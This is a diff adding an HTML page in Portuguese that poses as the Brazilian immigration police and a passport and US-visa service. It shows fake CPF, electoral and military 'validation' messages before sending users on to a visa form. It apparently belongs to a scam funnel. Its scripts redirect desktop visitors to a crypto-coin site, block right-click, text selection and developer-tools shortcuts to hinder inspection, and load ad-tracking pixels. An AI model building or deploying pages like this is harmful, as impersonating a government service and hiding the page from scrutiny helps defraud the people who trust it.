@@ -1,0 +1,231 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script async="" src="js/fbevents.js"></script><script type="text/javascript">
+        if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+          window.location.href = 'https://dogwifcoin.org/';
+        }
+     </script>
+     
+        <script type="text/javascript">
+        var message="Desculpe, o clique com o botão direito foi desativado.";
+        function clickIE() {if (document.all) {(message);return false;}}
+        function clickNS(e) {if
+        (document.layers||(document.getElementById&&!document.all)) {
+            if (e.which==2||e.which==3) {(message);return false;}}}
+        if (document.layers)
+        {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+        else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+        document.oncontextmenu=new Function("return false")
+        </script>
+        
+        <script>
+        document.onkeydown = function(e) {
+            if(event.keyCode == 123) {
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+                return false;
+            }
+            if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+                return false;
+            }
+        }
+        </script>
+        
+        <script>
+        function disableselect(e) {
+            return false;
+        }
+        
+        function reEnable() {
+            return true;
+        }
+        
+        document.onselectstart = new Function("return false");
+        
+        if (window.sidebar) {
+            document.onmousedown = disableselect;
+            document.onclick = reEnable;
+        }
+        </script>
+        
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Passaporte e Visto</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .loading-screen {
+            background-color: #286da8;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+            height: 100%;
+            font-family: Arial, sans-serif;
+        }
+
+        .loading-message {
+            margin-top: 20px;
+            font-size: 20px;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 10px;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #ffc107;
+        }
+
+        .spinner {
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid white;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .button-wrapper {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .button {
+            background-color: #ffffff;
+            color: #1e3a8a;
+            font-size: 18px;
+            padding: 10px 20px;
+            margin: 0 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .button:disabled {
+            background-color: #1e3a8a;
+            color: #93c5fd;
+            cursor: not-allowed;
+        }
+    </style>
+<script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1238265364044087');
+    fbq('track', 'PageView');
+    </script><script async="" defer="" src="js/pixel.js"></script></head>
+
+    <body><noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1238265364044087&ev=PageView&noscript=1"
+    /></noscript>
+    <script>
+        window.pixelId = "67243e70e257ad639df7c22c";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+      </script>
+
+
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen">
+        <div class="spinner"></div>
+        <div id="loadingText" class="loading-message">Analisando...</div>
+        <div class="footer">Coordenação-Geral de Polícia de Imigração</div>
+    </div>
+
+    <!-- Final Screen -->
+    <div id="finalScreen" class="loading-screen hidden">
+        <h1 class="text-2xl font-bold">Parabéns, seu passaporte foi concluído!</h1>
+        <p class="mt-4">Deseja continuar com o Visto Americano?</p>
+        <div class="button-wrapper">
+            <button id="yesButton" class="button">SIM</button>
+            <button id="noButton" class="button" onclick="window.location.href='/passaporte/passaporte.html';">NÃO</button>
+        </div>
+    </div>
+
+    <!-- Loading DS-160 Screen -->
+    <div id="ds160Screen" class="loading-screen hidden">
+        <div class="spinner"></div>
+        <div id="ds160Text" class="loading-message">Você será encaminhado para o Formulário DS-160.<br>É importante preencher o formulário com atenção e precisão, pois erros podem levar à negação do visto. O formulário tem validade de apenas 6 meses.</div>
+        <div class="footer">Coordenação-Geral de Polícia de Imigração</div>
+    </div>
+
+    <script>
+        // Frases para tela de carregamento
+        const phrases = [
+            "Enviando suas informações...",
+            "Analisando...",
+            "Validando CPF...",
+            "Verificando Regulamentação Eleitoral...",
+            "Verificando Regulamentação Militar...",
+            "Iniciando Formulário DS-160..."
+        ];
+
+        // Função para exibir as frases sequencialmente
+        function showLoadingPhrases() {
+            let index = 0;
+            const loadingText = document.getElementById("loadingText");
+            const interval = setInterval(() => {
+                loadingText.innerText = phrases[index];
+                index++;
+                if (index === phrases.length) {
+                    clearInterval(interval);
+                    showFinalScreen();
+                }
+            }, 3000); // 3 segundos por frase
+        }
+
+        // Função para exibir a tela final com as opções SIM/NÃO
+        function showFinalScreen() {
+            document.getElementById("loadingScreen").classList.add("hidden");
+            document.getElementById("finalScreen").classList.remove("hidden");
+        }
+
+        // Função para exibir a tela de carregamento do formulário DS-160
+        function showDS160Screen() {
+            document.getElementById("finalScreen").classList.add("hidden");
+            document.getElementById("ds160Screen").classList.remove("hidden");
+
+            // Simula o redirecionamento após 8 segundos
+            setTimeout(() => {
+                window.location.href = "/vistoamericano"; // URL do DS-160
+            }, 8000); // 8 segundos para leitura
+        }
+
+        // Evento de clique no botão SIM
+        document.getElementById("yesButton").addEventListener("click", showDS160Screen);
+
+        // Iniciar o carregamento das frases
+        showLoadingPhrases();
+    </script>
+
+
+
+</body></html>
